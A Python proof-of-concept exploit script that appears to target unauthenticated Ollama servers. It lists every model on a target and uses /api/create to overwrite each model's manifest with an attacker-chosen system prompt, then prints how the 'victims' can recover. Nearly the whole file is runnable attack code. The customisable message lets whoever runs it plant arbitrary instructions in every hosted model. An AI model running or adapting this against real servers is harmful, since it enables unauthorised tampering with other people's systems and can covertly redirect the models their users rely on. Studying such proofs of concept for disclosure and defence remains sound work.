#!/usr/bin/env python3
"""
PoC: Unauthenticated Mass Model Defacement via /api/create

Overwrites every model manifest on a target Ollama instance with a
custom system prompt. The weight blobs are never re-uploaded — only
the manifest JSON changes, making this fast regardless of model size.

Usage:
    python3 poc_deface.py <target>                          # default message
    python3 poc_deface.py <target> --message "custom text"
    python3 poc_deface.py <target> --restore               # re-pull all models from registry
"""

import argparse
import json
import sys
import urllib.request
import urllib.error

DEFAULT_MESSAGE = "This Ollama instance has been accessed by an unauthorized party."


def api_ndjson(target, path, body):
    url = target.rstrip("/") + path
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=60) as r:
        lines = r.read().decode().strip().splitlines()
    return [json.loads(l) for l in lines if l.strip()]


def list_models(target):
    result = api_ndjson(target, "/api/tags", {})
    return [m["name"] for m in result[0].get("models", [])]


def deface(target, model_name, message):
    body = {"model": model_name, "from": model_name, "system": message}
    lines = api_ndjson(target, "/api/create", body)
    last = lines[-1] if lines else {}
    return last.get("status") == "success", last


def restore(target, model_name):
    body = {"model": model_name}
    lines = api_ndjson(target, "/api/pull", body)
    last = lines[-1] if lines else {}
    return last.get("status") == "success", last


def main():
    parser = argparse.ArgumentParser(description="Ollama mass model defacement PoC")
    parser.add_argument("target", help="Ollama base URL, e.g. http://192.168.0.17:11434")
    parser.add_argument("--message", default=DEFAULT_MESSAGE,
                        help="System prompt to inject into every model")
    parser.add_argument("--restore", action="store_true",
                        help="Re-pull all models from upstream registry to recover original manifests")
    args = parser.parse_args()

    action = "Restoring (pull from registry)" if args.restore else "Defacing"

    print(f"[*] Target : {args.target}")
    if not args.restore:
        print(f"[*] Message: {args.message}")
    print()

    try:
        models = list_models(args.target)
    except Exception as e:
        print(f"[-] Failed to list models: {e}", file=sys.stderr)
        sys.exit(1)

    if not models:
        print("[-] No models found on target.")
        sys.exit(0)

    print(f"[*] Found {len(models)} model(s): {', '.join(models)}")
    print()

    ok_count = 0
    for name in models:
        try:
            if args.restore:
                success, status = restore(target=args.target, model_name=name)
            else:
                success, status = deface(args.target, name, args.message)

            if success:
                print(f"[+] {action}: {name}")
                ok_count += 1
            else:
                print(f"[-] Failed  : {name}  ({status})")
        except urllib.error.HTTPError as e:
            print(f"[-] HTTP {e.code}: {name}")
        except Exception as e:
            print(f"[-] Error   : {name}  ({e})")

    print()
    print(f"[*] Done. {ok_count}/{len(models)} models affected.")
    if not args.restore:
        print(f"[!] Victims must run 'ollama pull <model>' for each model to recover.")


if __name__ == "__main__":
    main()
